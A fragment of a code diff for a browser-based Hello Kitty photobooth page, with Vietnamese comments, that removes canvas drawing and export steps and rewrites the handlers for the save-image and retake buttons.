-            ctx.font = "900 68px 'Quicksand', sans-serif";
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            ctx.fillText('🎀 Hello Kitty Photobooth 🎀', CANVAS_W / 2, textY);
-
-            // BƯỚC 5: Vẽ 2 Vector Hello Kitty Đính Lên Góc Khung
-            // Vẽ 1 bé bám vào góc trên bên trái
-            drawVectorKitty(ctx, photoX + 40, photoY - 20, 1.3);
-            // Vẽ 1 bé bám vào góc dưới bên phải
-            drawVectorKitty(ctx, photoX + photoW - 40, photoY + photoH + 20, 1.1);
-
-            // BƯỚC 6: Xuất thành phẩm và đưa ra màn hình điện thoại
-            const finalImageBase64 = canvas.toDataURL('image/jpeg', 0.95);
-            resultImg.src = finalImageBase64;
-
-            // Chuyển đổi giao diện: Ẩn Camera Đen, Hiện Ảnh, Đổi Nút
-            video.style.display = 'none';
-            resultImg.style.display = 'block';
-            
-            startBtn.style.display = 'none';
-            resultControls.style.display = 'flex';
-            
-            statusText.innerHTML = "✨ Tadaaaa! Ảnh của bạn đã xong ✨<br>Bấm Lưu Ảnh Về để tải chất lượng cao nhé!";
-        };
-        img.src = base64Src;
-    }
-
-    // 6. XỬ LÝ NÚT TẢI ẢNH (DOWNLOAD)
+    // Xử lý nút LƯU ẢNH VỀ
     document.getElementById('saveBtn').addEventListener('click', () => {
         const link = document.createElement('a');
         link.href = resultImg.src;
-        // Đặt tên file có timestamp để không bị trùng
-        link.download = `Photobooth_HelloKitty_${Date.now()}.jpg`;
+        // Đặt tên file download ngẫu nhiên xịn xò
+        const dateStr = new Date().getTime();
+        link.download = `HelloKitty_Photobooth_${dateStr}.jpg`;
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
     });
 
-    // 7. XỬ LÝ NÚT CHỤP LẠI (RETAKE)
+    // Xử lý nút CHỤP LẠI
     document.getElementById('retakeBtn').addEventListener('click', () => {
-        // Reload toàn bộ trang là phương pháp an toàn nhất, 
-        // đảm bảo mọi bộ nhớ đệm và module camera của main.js đều được khôi phục nguyên trạng.
+        // Reload lại hẳn trang để mọi thứ (cả main.js) được reset sạch sẽ từ đầu
+        // Đảm bảo không dính bug camera của trình duyệt
         window.location.reload();
     });
 </script>
